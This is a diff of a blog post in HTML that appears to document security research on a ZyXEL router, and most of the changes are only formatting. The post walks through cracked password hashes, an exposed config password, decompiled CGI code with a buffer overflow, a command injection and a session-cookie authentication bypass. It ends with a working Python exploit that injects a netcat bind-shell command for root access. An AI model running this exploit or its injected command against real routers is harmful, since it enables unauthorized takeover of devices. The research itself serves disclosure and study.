@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="generator" content="Hugo 0.92.2" />
+  <meta name="generator" content="Hugo 0.115.4">
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -142,8 +142,8 @@ user:$1$$iC.dUsGpxNNJGeOm1dFio/:13013:0:99999:7:::
 supervisor:$1$QsMQ44HY$.VcW9Y2tY6EBLoIB4krrb.:13013:0:99999:7:::
 </code></pre><p>Running john on these hashes with <code>rockyou.txt</code> gave a hit on both admin and user, with the password 1234. Running hashcat with a bruteforce attack to crack root, overnight, also yielded nothing. Sadly we couldn’t get root this easily. We also tried finding binaries that were running with SUID, to see if we could privilege escalate from user to root. <code>find / -perm -u=s -type f 2&gt;/dev/null</code>, to be fair, there’s probably a lot of ways to privilege escalate, but none that we thought were fun (Like exploiting dirty cow, since it’s an older router). What I found really interesting were the two binaries <code>zytr069cmd</code>, and <code>zyDeviceID</code>. Surface level reversing of these two binaries however, seemed to indicate, that these were not at all suitable targets, and barely even seemed to function properly.</p>
 <p>Another thing that sprung out in my eyes, was the “password” in some of the users config files. It said:</p>
-<pre tabindex="0"><code>&lt;ConnectionRequestPassword PARAMETER=&quot;configured&quot;
-TYPE=&quot;string&quot; LENGTH=&quot;256&quot;&gt;cpeP4ss!&lt;/ConnectionRequestPassword&gt;
+<pre tabindex="0"><code>&lt;ConnectionRequestPassword PARAMETER=&#34;configured&#34;
+TYPE=&#34;string&#34; LENGTH=&#34;256&#34;&gt;cpeP4ss!&lt;/ConnectionRequestPassword&gt;
 </code></pre><p>We never found out what this was used for, but it seems like it could be useful.</p>
 <h3 id="extracting-source-code">Extracting source code</h3>
 <p>We found out that through playing with the web interface, that it was consequently refering to .cgi files. Searching for these gave a lot of hits, and suddenly we had source for all the websites - written in C. Surely that can’t go wrong?</p>
@@ -153,21 +153,21 @@ TYPE=&quot;string&quot; LENGTH=&quot;256&quot;&gt;cpeP4ss!&lt;/ConnectionRequest
 <h1 id="finding-bugs-everywhere">Finding bugs everywhere</h1>
 <h3 id="using-what-weve-learnt">Using what we’ve learnt</h3>
 <p>Now we began analyzing these CGI binaries. We started by noting that they were <code>ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</code>. So we were dealing with 32-bit big endian executables written in C. I wrote a small bash script to extract functions from the different CGI binaries, as there were many.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#00f">#!/bin/bash
-</span><span style="color:#00f"></span>
-<span style="color:#008000"># Store directory of .cgi files</span>
-DIR=$1
-
-<span style="color:#008000"># Create output file &#34;results.txt&#34;</span>
-touch results.txt
-
-<span style="color:#008000"># Run rabin2 command on each .cgi file in the directory </span>
-<span style="color:#00f">for</span> file in $DIR/*.cgi; <span style="color:#00f">do</span>
-	echo <span style="color:#a31515">&#34;File: </span>$file<span style="color:#a31515">&#34;</span> &gt;&gt; results.txt
-	rabin2 -i $file &gt;&gt; results.txt
-	echo -e <span style="color:#a31515">&#34;\n\n&#34;</span> &gt;&gt; results.txt
-<span style="color:#00f">done</span>
-</code></pre></div><p>Quickly we see a lot of interesting files, let’s take an example:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#00f">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#00f"></span>
+</span></span><span style="display:flex;"><span><span style="color:#008000"># Store directory of .cgi files</span>
+</span></span><span style="display:flex;"><span>DIR=$1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#008000"># Create output file &#34;results.txt&#34;</span>
+</span></span><span style="display:flex;"><span>touch results.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#008000"># Run rabin2 command on each .cgi file in the directory </span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">for</span> file in $DIR/*.cgi; <span style="color:#00f">do</span>
+</span></span><span style="display:flex;"><span>	echo <span style="color:#a31515">&#34;File: </span>$file<span style="color:#a31515">&#34;</span> &gt;&gt; results.txt
+</span></span><span style="display:flex;"><span>	rabin2 -i $file &gt;&gt; results.txt
+</span></span><span style="display:flex;"><span>	echo -e <span style="color:#a31515">&#34;\n\n&#34;</span> &gt;&gt; results.txt
+</span></span><span style="display:flex;"><span><span style="color:#00f">done</span>
+</span></span></code></pre></div><p>Quickly we see a lot of interesting files, let’s take an example:</p>
 <pre tabindex="0"><code>File: ./wlan_wpsinfo.cgi
 [Imports]
 nth vaddr      bind   type   lib name
@@ -188,10 +188,9 @@ nth vaddr      bind   type   lib name
     int32_t var_110 = 0
     checkTimeOut()
     char stack_buffer 
-    if (getenv(&quot;QUERY_STRING&quot;) != 0)
-        strcpy(&amp;stack_buffer, getenv(&quot;QUERY_STRING&quot;))
+    if (getenv(&#34;QUERY_STRING&#34;) != 0)
+        strcpy(&amp;stack_buffer, getenv(&#34;QUERY_STRING&#34;))
         ... }
-
 </code></pre><p>We can see we have a direct overflow here, this is due to the fact that <code>strcpy</code> does no bounds checking. Recall the sidetrack from before, we have control over the QUERY_STRING, if we send a GET request to this endpoint. This is one of many vulnerabilities of this type. Running <code>checksec</code> to check security mitigations on the binary we’re happy to see, that there are none.</p>
 <pre tabindex="0"><code>Arch:     mips-32-big
 RELRO:    No RELRO
@@ -202,27 +201,27 @@ RWX:      Has RWX segments
 </code></pre><p>We could perhaps use this for a buffer overflow, and then do return-oriented programming on the router, and run code like this. Cool!</p>
 <h3 id="looking-further-command-injection">Looking further, command injection</h3>
 <p>There’s so much wrong with this code, so we continued to look on. If it used <code>system</code>, we might be lucky to get a straight up command injection. After some time investigating these files, we see that we have the following interesting code:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#00f"># qos_queue.cgi
-</span><span style="color:#00f"></span>
-templateSetVar(<span style="color:#a31515">&#34;QueueNumber&#34;</span>, &amp;qname)
-templateSetVar(<span style="color:#a31515">&#34;EnableNumber&#34;</span>, &amp;qname)
-templateSetVar(<span style="color:#a31515">&#34;WebQueueNumber&#34;</span>, &amp;qname)
-<span style="color:#2b91af">void</span>* <span style="color:#00f">const</span> var_10_1
-<span style="color:#00f">if</span> (zx.d(<span style="">$</span>v0_27[2].b) == 0)
-    var_10_1 = &amp;data_403314
-<span style="color:#00f">else</span>
-    var_10_1 = &amp;data_403310
-templateSetVar(<span style="color:#a31515">&#34;activechk&#34;</span>, var_10_1)
-<span style="color:#00f">if</span> (var_1ac_1 == 1)
-    templateSetVar(<span style="color:#a31515">&#34;DefaultCheckDisable&#34;</span>, <span style="color:#a31515">&#34;disabled=&#34;</span>true<span style="color:#a31515">&#34;&#34;</span>)
-strcpy(&amp;qname, <span style="">$</span>v0_27 + 0x11a)
-templateSetVar(<span style="color:#a31515">&#34;QName&#34;</span>, &amp;qname)
-strcpy(&amp;qname, <span style="">$</span>v0_27 + 0xd)
-<span style="color:#2b91af">void</span> command
-sprintf(&amp;command, <span style="color:#a31515">&#34;echo Interface is %s &gt;&gt; /var/web…&#34;</span>, &amp;qname)
-system(&amp;command)
-...
-</code></pre></div><p>We see that we’re using the <code>sprintf</code> command here, to read into <code>command</code> and then we run system, with this command. If we can control the <code>qname</code> here we’ve won. We can read the <code>/var/webqos.txt</code>, and see that whenever we send a request to <code>qos_queue.cgi</code>. Another line gets added to the webqos.txt file. Specifically the text <code>WAN</code>. Playing around with the ZyXEL portal interface, we found out that we could go to Network Setting &gt; QoS &gt; Queue Setup, intercepting this request we see:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#00f"># qos_queue.cgi
+</span></span></span><span style="display:flex;"><span><span style="color:#00f"></span>
+</span></span><span style="display:flex;"><span>templateSetVar(<span style="color:#a31515">&#34;QueueNumber&#34;</span>, &amp;qname)
+</span></span><span style="display:flex;"><span>templateSetVar(<span style="color:#a31515">&#34;EnableNumber&#34;</span>, &amp;qname)
+</span></span><span style="display:flex;"><span>templateSetVar(<span style="color:#a31515">&#34;WebQueueNumber&#34;</span>, &amp;qname)
+</span></span><span style="display:flex;"><span><span style="color:#2b91af">void</span>* <span style="color:#00f">const</span> var_10_1
+</span></span><span style="display:flex;"><span><span style="color:#00f">if</span> (zx.d(<span style="">$</span>v0_27[2].b) == 0)
+</span></span><span style="display:flex;"><span>    var_10_1 = &amp;data_403314
+</span></span><span style="display:flex;"><span><span style="color:#00f">else</span>
+</span></span><span style="display:flex;"><span>    var_10_1 = &amp;data_403310
+</span></span><span style="display:flex;"><span>templateSetVar(<span style="color:#a31515">&#34;activechk&#34;</span>, var_10_1)
+</span></span><span style="display:flex;"><span><span style="color:#00f">if</span> (var_1ac_1 == 1)
+</span></span><span style="display:flex;"><span>    templateSetVar(<span style="color:#a31515">&#34;DefaultCheckDisable&#34;</span>, <span style="color:#a31515">&#34;disabled=&#34;</span>true<span style="color:#a31515">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>strcpy(&amp;qname, <span style="">$</span>v0_27 + 0x11a)
+</span></span><span style="display:flex;"><span>templateSetVar(<span style="color:#a31515">&#34;QName&#34;</span>, &amp;qname)
+</span></span><span style="display:flex;"><span>strcpy(&amp;qname, <span style="">$</span>v0_27 + 0xd)
+</span></span><span style="display:flex;"><span><span style="color:#2b91af">void</span> command
+</span></span><span style="display:flex;"><span>sprintf(&amp;command, <span style="color:#a31515">&#34;echo Interface is %s &gt;&gt; /var/web…&#34;</span>, &amp;qname)
+</span></span><span style="display:flex;"><span>system(&amp;command)
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>We see that we’re using the <code>sprintf</code> command here, to read into <code>command</code> and then we run system, with this command. If we can control the <code>qname</code> here we’ve won. We can read the <code>/var/webqos.txt</code>, and see that whenever we send a request to <code>qos_queue.cgi</code>. Another line gets added to the webqos.txt file. Specifically the text <code>WAN</code>. Playing around with the ZyXEL portal interface, we found out that we could go to Network Setting &gt; QoS &gt; Queue Setup, intercepting this request we see:</p>
 <pre tabindex="0"><code>POST /qos_queue_add.cgi HTTP/1.1 
 Host: 192.168.1.1 
 Content-Length: 159 
@@ -252,39 +251,38 @@ root
 </code></pre><p>Well, seems like we’re already root. Well.. Damn.. Let’s look at getting an authentication bypass now.</p>
 <h3 id="revshell-v20-added-authentication-bypass">RevShell v2.0, added authentication bypass!</h3>
 <p>Looking for which server is responsible for authentication we found that there was a service running called <code>mini_httpd</code>, which was responsible for directing traffic to CGI binaries. In this binary there was code for checking whether a user was authenticated.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#2b91af">void</span> ip_addr
-<span style="color:#00f">if</span> (var_e40 != 0)
-    <span style="color:#2b91af">int32_t</span> stream = fopen(&amp;stream<span style="">#</span>-1, <span style="color:#a31515">&#34;r+&#34;</span>)
-    <span style="color:#00f">if</span> (stream == 0)
-        var_e4c = 0
-        <span style="color:#2b91af">int32_t</span> open_tmp_file = fopen(&amp;stream<span style="">#</span>-1, <span style="color:#a31515">&#34;w&#34;</span>)
-        <span style="color:#00f">if</span> (open_tmp_file != 0)
-            _fprintf(open_tmp_file, <span style="color:#a31515">&#34;0 %s NULL %d &#34;</span>, &amp;session_cookie, 1, auth)
-            _fclose(open_tmp_file)
-    <span style="color:#00f">else</span>
-        <span style="color:#2b91af">void</span> authorization
-        auth = &amp;authorization
-        <span style="color:#2b91af">int32_t</span> num
-        <span style="color:#00f">if</span> (_fscanf(stream, <span style="color:#a31515">&#34;%d %s %s &#34;</span>, &amp;num, &amp;ip_addr, auth) s&lt; 3)
-            var_e4c = 1
-            _fclose(stream)
-            _unlink(&amp;stream<span style="">#</span>-1)
-        <span style="color:#00f">else</span>
-            <span style="color:#2b91af">int32_t</span> var_bf4
-            _sysinfo(&amp;var_bf4)
-            <span style="color:#00f">if</span> (_strcmp(check_file(&amp;data_42b9b8), &amp;ip_addr) != 0)
-                _memcpy(&amp;authorization, <span style="color:#a31515">&#34;NULL&#34;</span>, 5)
-                var_e4c = 0
-                sub_401f10(stream)
-                auth = &amp;authorization
-                var_eac = 1
-                _fprintf(stream, <span style="color:#a31515">&#34;%d %s %s %d &#34;</span>, var_bf4, &amp;ip_addr, auth, 1)
-                _fclose(stream)
-            <span style="color:#00f">else</span>
-                <span style="color:#00f">if</span> (_strcmp(&amp;authorization, <span style="color:#a31515">&#34;admin&#34;</span>) != 0)
-                    <span style="color:#00f">if</span> (_strcmp(&amp;authorization, <span style="color:#a31515">&#34;user&#34;</span>) == 0)
-
-</code></pre></div><p>This is the main part of the code, we’re interested in. We can approach it with a bottom-up approach. We see that it checks the authorization string whether we’re admin, or user. This authorization is used a few places. Checking with remote, we can see that there’s files named accordingly to our ip addresses. Such that if my ip is <code>192.168.1.44</code>, and I’m not logged in, it will create a file called <code>192.168.1.44</code> with the content: <code>some_number 192.168.1.44 NULL 0</code>, now we would like this to say <code>some_number 192.168.1.44 admin 0</code>, as this describes a logged in session. Let’s continue. We see that we’re using <code>fscanf</code> with three arguments, a number, then two strings. The way <code>fscanf</code> works is, reading from a file, it will populate the arguments after the format specifier. I.e. <code>fscanf(stream, N- format_specifiers, N- amount of arguments);</code>. Now we note that this logic is only reached if the file already exists. Right above the logic is described for creating the file. It will take the session cookie, and write into the file. This is the bug. We can actually send a session cookie with spaces in it, like so <code>AAA BBB CCC DDD EEE FFF GGG</code>, then when the <code>fscanf</code> later is called, we can now control the <code>ip</code>, and <code>auth</code>, etc.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#2b91af">void</span> ip_addr
+</span></span><span style="display:flex;"><span><span style="color:#00f">if</span> (var_e40 != 0)
+</span></span><span style="display:flex;"><span>    <span style="color:#2b91af">int32_t</span> stream = fopen(&amp;stream<span style="">#</span>-1, <span style="color:#a31515">&#34;r+&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span> (stream == 0)
+</span></span><span style="display:flex;"><span>        var_e4c = 0
+</span></span><span style="display:flex;"><span>        <span style="color:#2b91af">int32_t</span> open_tmp_file = fopen(&amp;stream<span style="">#</span>-1, <span style="color:#a31515">&#34;w&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> (open_tmp_file != 0)
+</span></span><span style="display:flex;"><span>            _fprintf(open_tmp_file, <span style="color:#a31515">&#34;0 %s NULL %d &#34;</span>, &amp;session_cookie, 1, auth)
+</span></span><span style="display:flex;"><span>            _fclose(open_tmp_file)
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">else</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#2b91af">void</span> authorization
+</span></span><span style="display:flex;"><span>        auth = &amp;authorization
+</span></span><span style="display:flex;"><span>        <span style="color:#2b91af">int32_t</span> num
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> (_fscanf(stream, <span style="color:#a31515">&#34;%d %s %s &#34;</span>, &amp;num, &amp;ip_addr, auth) s&lt; 3)
+</span></span><span style="display:flex;"><span>            var_e4c = 1
+</span></span><span style="display:flex;"><span>            _fclose(stream)
+</span></span><span style="display:flex;"><span>            _unlink(&amp;stream<span style="">#</span>-1)
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">else</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#2b91af">int32_t</span> var_bf4
+</span></span><span style="display:flex;"><span>            _sysinfo(&amp;var_bf4)
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">if</span> (_strcmp(check_file(&amp;data_42b9b8), &amp;ip_addr) != 0)
+</span></span><span style="display:flex;"><span>                _memcpy(&amp;authorization, <span style="color:#a31515">&#34;NULL&#34;</span>, 5)
+</span></span><span style="display:flex;"><span>                var_e4c = 0
+</span></span><span style="display:flex;"><span>                sub_401f10(stream)
+</span></span><span style="display:flex;"><span>                auth = &amp;authorization
+</span></span><span style="display:flex;"><span>                var_eac = 1
+</span></span><span style="display:flex;"><span>                _fprintf(stream, <span style="color:#a31515">&#34;%d %s %s %d &#34;</span>, var_bf4, &amp;ip_addr, auth, 1)
+</span></span><span style="display:flex;"><span>                _fclose(stream)
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#00f">if</span> (_strcmp(&amp;authorization, <span style="color:#a31515">&#34;admin&#34;</span>) != 0)
+</span></span><span style="display:flex;"><span>                    <span style="color:#00f">if</span> (_strcmp(&amp;authorization, <span style="color:#a31515">&#34;user&#34;</span>) == 0)
+</span></span></code></pre></div><p>This is the main part of the code, we’re interested in. We can approach it with a bottom-up approach. We see that it checks the authorization string whether we’re admin, or user. This authorization is used a few places. Checking with remote, we can see that there’s files named accordingly to our ip addresses. Such that if my ip is <code>192.168.1.44</code>, and I’m not logged in, it will create a file called <code>192.168.1.44</code> with the content: <code>some_number 192.168.1.44 NULL 0</code>, now we would like this to say <code>some_number 192.168.1.44 admin 0</code>, as this describes a logged in session. Let’s continue. We see that we’re using <code>fscanf</code> with three arguments, a number, then two strings. The way <code>fscanf</code> works is, reading from a file, it will populate the arguments after the format specifier. I.e. <code>fscanf(stream, N- format_specifiers, N- amount of arguments);</code>. Now we note that this logic is only reached if the file already exists. Right above the logic is described for creating the file. It will take the session cookie, and write into the file. This is the bug. We can actually send a session cookie with spaces in it, like so <code>AAA BBB CCC DDD EEE FFF GGG</code>, then when the <code>fscanf</code> later is called, we can now control the <code>ip</code>, and <code>auth</code>, etc.</p>
 <h3 id="exploit-plan">Exploit plan</h3>
 <ol>
 <li>Create a request, to create this file (with malicious session)</li>
@@ -296,55 +294,55 @@ root
 </ol>
 <h1 id="final-proof-of-concept-script">Final Proof-of-Concept script</h1>
 <p>(Note: Due to wrapping, you might need to scroll to the right to see the full request)</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000">#!/usr/bin/python3</span>
-
-<span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
-<span style="color:#00f">import</span> urllib.parse
-<span style="color:#00f">import</span> requests
-<span style="color:#00f">import</span> sys
-
-<span style="color:#00f">try</span>:
-    HOST = sys.argv[1]
-<span style="color:#00f">except</span> IndexError: 
-    exit(<span style="color:#a31515">&#34;Sorry I need your IP as argument to run, e.g. ./poc.py 192.168.1.44&#34;</span>)
-
-MALICIOUS = HOST + <span style="color:#a31515">&#34; admin 0&#34;</span>
-COMMAND = urllib.parse.quote(<span style="color:#a31515">&#34;nc -l -p 1337 -e &#39;sh&#39;&#34;</span>)
-
-print(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;[*] Attempting to create session file with evil session </span><span style="color:#a31515">{</span>MALICIOUS<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
-r=requests.get(<span style="color:#a31515">&#34;http://192.168.1.1/qos_queue_add.cgi&#34;</span>, cookies={<span style="color:#a31515">&#34;session&#34;</span>:MALICIOUS})
-
-req = <span style="color:#a31515">f</span><span style="color:#a31515">&#34;&#34;&#34;POST /qos_queue_add.cgi HTTP/1.1
-</span><span style="color:#a31515">Host: 192.168.1.1
-</span><span style="color:#a31515">Content-Length: 159
-</span><span style="color:#a31515">Cache-Control: no-cache
-</span><span style="color:#a31515">Pragma: no-cache
-</span><span style="color:#a31515">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
-</span><span style="color:#a31515">Content-Type: application/x-www-form-urlencoded
-</span><span style="color:#a31515">Accept: text/html, /
-</span><span style="color:#a31515">X-Requested-With: XMLHttpRequest
-</span><span style="color:#a31515">If-Modified-Since: 0
-</span><span style="color:#a31515">Expires: 0
-</span><span style="color:#a31515">Origin: http://192.168.1.1/
-</span><span style="color:#a31515">Referer: http://192.168.1.1/indexMain.cgi
-</span><span style="color:#a31515">Accept-Encoding: gzip, deflate
-</span><span style="color:#a31515">Accept-Language: en-US,en;q=0.9
-</span><span style="color:#a31515">Cookie: session=</span><span style="color:#a31515">{</span>MALICIOUS<span style="color:#a31515">}</span><span style="color:#a31515">
-</span><span style="color:#a31515">Connection: close
-</span><span style="color:#a31515">
-</span><span style="color:#a31515">Submit=Apply&amp;WebQueueActiveCfg=Active&amp;QueueObjectIndex=1&amp;QueueNameTxt=WAN_Default_Queue&amp;WebQueueInterface=WAN;</span><span style="color:#a31515">{</span>COMMAND<span style="color:#a31515">}</span><span style="color:#a31515">;&amp;WebQueuePriority=3&amp;WebQueueWeight=1&amp;WebQueueRate=&#34;&#34;&#34;</span>.encode()
-
-print(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;[*] Now sending the payload to run following command (url-encoded): </span><span style="color:#a31515">{</span>COMMAND<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
-io = remote(<span style="color:#a31515">&#34;192.168.1.1&#34;</span>, 80)
-io.send(req)
-io.close()
-
-sleep(1)
-
-io = remote(<span style="color:#a31515">&#34;192.168.1.1&#34;</span>, 1337)
-print(<span style="color:#a31515">&#34;[*] Got shell!&#34;</span>)
-io.interactive()
-</code></pre></div><p>And:
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#008000">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+</span></span><span style="display:flex;"><span><span style="color:#00f">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#00f">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#00f">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">try</span>:
+</span></span><span style="display:flex;"><span>    HOST = sys.argv[1]
+</span></span><span style="display:flex;"><span><span style="color:#00f">except</span> IndexError: 
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#a31515">&#34;Sorry I need your IP as argument to run, e.g. ./poc.py 192.168.1.44&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MALICIOUS = HOST + <span style="color:#a31515">&#34; admin 0&#34;</span>
+</span></span><span style="display:flex;"><span>COMMAND = urllib.parse.quote(<span style="color:#a31515">&#34;nc -l -p 1337 -e &#39;sh&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;[*] Attempting to create session file with evil session </span><span style="color:#a31515">{</span>MALICIOUS<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
+</span></span><span style="display:flex;"><span>r=requests.get(<span style="color:#a31515">&#34;http://192.168.1.1/qos_queue_add.cgi&#34;</span>, cookies={<span style="color:#a31515">&#34;session&#34;</span>:MALICIOUS})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>req = <span style="color:#a31515">f</span><span style="color:#a31515">&#34;&#34;&#34;POST /qos_queue_add.cgi HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Host: 192.168.1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Content-Length: 159
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Cache-Control: no-cache
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Pragma: no-cache
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Accept: text/html, /
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">X-Requested-With: XMLHttpRequest
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">If-Modified-Since: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Expires: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Origin: http://192.168.1.1/
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Referer: http://192.168.1.1/indexMain.cgi
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Accept-Encoding: gzip, deflate
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Accept-Language: en-US,en;q=0.9
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Cookie: session=</span><span style="color:#a31515">{</span>MALICIOUS<span style="color:#a31515">}</span><span style="color:#a31515">
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Submit=Apply&amp;WebQueueActiveCfg=Active&amp;QueueObjectIndex=1&amp;QueueNameTxt=WAN_Default_Queue&amp;WebQueueInterface=WAN;</span><span style="color:#a31515">{</span>COMMAND<span style="color:#a31515">}</span><span style="color:#a31515">;&amp;WebQueuePriority=3&amp;WebQueueWeight=1&amp;WebQueueRate=&#34;&#34;&#34;</span>.encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;[*] Now sending the payload to run following command (url-encoded): </span><span style="color:#a31515">{</span>COMMAND<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
+</span></span><span style="display:flex;"><span>io = remote(<span style="color:#a31515">&#34;192.168.1.1&#34;</span>, 80)
+</span></span><span style="display:flex;"><span>io.send(req)
+</span></span><span style="display:flex;"><span>io.close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sleep(1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io = remote(<span style="color:#a31515">&#34;192.168.1.1&#34;</span>, 1337)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a31515">&#34;[*] Got shell!&#34;</span>)
+</span></span><span style="display:flex;"><span>io.interactive()
+</span></span></code></pre></div><p>And:
 <img src="/pictures/result-payload.png" alt="result-payload"></p>
 <h1 id="references">References</h1>
 <p>[0]: <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">https://en.wikipedia.org/wiki/Common_Gateway_Interface</a></p>
